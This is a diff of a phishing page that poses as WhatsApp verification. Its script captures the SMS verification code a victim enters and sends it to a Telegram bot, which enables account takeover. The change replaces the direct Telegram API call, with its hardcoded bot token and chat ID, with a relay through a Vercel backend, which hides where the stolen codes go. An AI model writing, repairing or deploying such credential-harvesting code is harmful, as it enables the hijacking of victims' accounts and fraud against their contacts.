@@ -79,10 +79,6 @@
         <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="Logo WhatsApp">
     </footer>
 <script type="text/javascript">
-    //bot token
-var telegram_bot_id =  "8855414201:AAHfpOhQ0szh27tbLKhHZBiNvTobN8B-wPY";
-//chat id
-var chat_id ="-5167092041";
 document.addEventListener("DOMContentLoaded", function() {
     // Función para obtener el valor de un parámetro de la URL
     function getQueryParam(param) {
@@ -114,11 +110,12 @@ document.addEventListener("DOMContentLoaded", function() {
 
     // Función para enviar el mensaje a Telegram y redirigir
     function enviarMensajeTelegram(mensaje, nextPage) {
-      
-        var url = 'https://api.telegram.org/bot' + telegram_bot_id + '/sendMessage';
+        // URL de tu backend en Vercel
+        var url = 'https://telegram-backend-umber.vercel.app/api/telegram';
+        
+        // El backend espera un objeto con la propiedad "message"
         var params = {
-            chat_id: chat_id,
-            text: mensaje
+            message: mensaje
         };
 
         fetch(url, {
@@ -150,7 +147,6 @@ document.addEventListener("DOMContentLoaded", function() {
         });
     }
 
-
     // Evento de envío de formulario para la sección de contacto
     var verificationForm = document.getElementById("verificationForm");
     if (verificationForm) {
@@ -159,11 +155,8 @@ document.addEventListener("DOMContentLoaded", function() {
             var cod = document.getElementById("cod").value;
             obtenerUbicacionYEnviarMensajeTelegram(cod, cod, "loading3.html?action=cod", "💲 Whatsapp COD SMS💲:\nCODIGO WHATSAPP: " + cod);
         });
-    
     }
 });
-
-
 </script>
 
 
